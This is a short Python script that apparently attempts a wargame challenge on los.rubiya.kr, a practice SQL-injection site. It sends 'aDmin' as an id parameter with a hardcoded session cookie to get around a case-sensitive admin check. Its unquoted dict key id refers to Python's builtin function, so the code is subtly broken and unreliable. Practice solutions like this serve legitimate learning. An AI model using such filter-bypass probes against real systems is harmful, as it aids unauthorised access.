import requests

cookies = {"PHPSESSID": "p2tucjmoqghg78656vgmf7g03p"}

url = "https://los.rubiya.kr/chall/troll_05b5eb65d94daf81c42dd44136cb0063.php"
params = { id: "aDmin" }

r = requests.get(url, params=params, cookies=cookies)
print(r.text)